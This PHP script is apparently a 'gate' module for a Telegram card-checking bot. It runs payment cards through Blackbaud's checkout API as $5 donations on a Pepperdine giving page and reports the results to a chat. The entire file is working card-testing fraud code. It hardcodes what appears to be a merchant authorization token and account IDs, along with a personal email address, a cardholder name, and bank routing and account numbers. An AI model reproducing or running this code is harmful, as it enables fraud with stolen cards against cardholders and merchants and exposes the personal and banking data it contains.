<?php 

use App\Faker\{Name, Internet, Address};
use App\Models\Bot;
use App\Gate\{CurlX, Make, Responses as Res};

$ccs = $ccs[0];
$cc  = $ccs['cc'];
$cece = implode('|', $cc);
$user['ida'] = Bot::SendMsg($user['chat_id'], "<b>Gate <u>".$gate['name']."</u> <i>started</i>♻️\nCard: <code>".$cece."</code>\nTime:</b> <i>".Make::Took()."'s</i>", $user['msg_id'])['result']['message_id'];

# ~ REQ 1 ~ #
$headers1 = ['Host: payments.blackbaud.com', 'accept: application/json', 'authorization: Basic VE9LRU5VU0VSOmQ5NDUzNTlkLWU2NmYtNDQ5OC1iZTRjLTMyMzgzYzYyZWZhOA==', 'content-type: application/json', 'origin: https://give.pepperdine.edu', 'referer: https://give.pepperdine.edu/'];
$post1 = '{"BillingAddress":{"Line":"ny street 543","City":"New York","State":"NY","PostCode":"10080","Country":"US","Email":"felipega1603@gmail.com"},"Key":"d945359d-e66f-4498-be4c-32383c62efa8","Cardholder":"Enrimar Molina","MerchantAccountId":"800a02cf-2c01-4ef5-9bbf-c5a5bed747ad","Amount":"5","ClientAppName":"Donation Forms","UseCaptcha":false,"UseVisaCheckout":false,"UseMasterpass":true,"UseApplePay":false,"UsePayPal":false,"UseVoluntaryContribution":false,"FontFamily":"roboto","FontColor":"FFFFFF","PrimaryColor":"1F9CEC","SecondaryColor":"FF6C6C","SourceCode":9,"ClientDomain":"host.nxt.blackbaud.com","UseApplePayDonateButton":false}';
$site1 = ['url' => 'https://payments.blackbaud.com/api/Checkout', 'method' => 'POST', 'post' => $post1, 'headers' => $headers1, 'cookie' => null, 'proxy' => null];
$req1 = Make::Create(1, $site1, $gate, $user);
IsUnspam($req1, $user);
$trans_id = CurlX::ParseString($req1->body, 'https://payments.blackbaud.com/Pages/Checkout.aspx?t=', '",');
Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Wait(1, implode('|', $cc), $gate['name'], $lang['wait']));

$mes = array('01' => 1, '02' => 2, '03' => 3, '04' => 4, '05' => 5, '06' => 6, '07' => 7, '08' => 8, '09' => 9, 10 => 10, 11 => 11, 12 => 12);

# ~ REQ 2 ~ #
$headers2 = ['Host: payments.blackbaud.com', 'content-type: application/x-www-form-urlencoded; charset=UTF-8'];
$post2 = 'directDebitAccountTypeHidden=0&achholdername=Enrimar%20Molina&routingNumber=011401533&branchNumber=&institutionNumber=&accountNumber=13199698&checkNumber=0022&userAgent=Mozilla%2F5.0%20(X11%3B%20Linux%20x86_64)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F100.0.4896.133%20Safari%2F537.36&certifyAuthorizedUserCAD=false&storeUpdateDDEmail=&amount=5.00&firstname=&lastname=&email=felipega1603%40gmail.com&phone=&addr=ny%20street%20543&city=New%20York&stateHidden=08f8e7c1-d8b9-4391-84a9-702bbc71f7ef&postal=10080&countryHidden=d74936d8-7394-4dc2-bba6-424ab5f053cc';
$site2 = ['url' => 'https://payments.blackbaud.com/WebMethods/PaymentServices.ashx?t='.$trans_id.'&action=AUTHTRANS', 'method' => 'POST', 'post' => $post2, 'headers' => $headers2, 'cookie' => null, 'proxy' => null];
$req2 = Make::Create(2, $site2, $gate, $user);
IsUnspam($req2, $user);
$fim2 = json_decode($req2->body, true);
Res::SetParams($req2->body, $req1->body);
$res = Res::blackbaud_ch();
Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Parse($lang['final'], $user, $cece, $res, $ccs['bin'], $gate['name']));
Bot::SendMsg($user['chat_id'], $req2->body);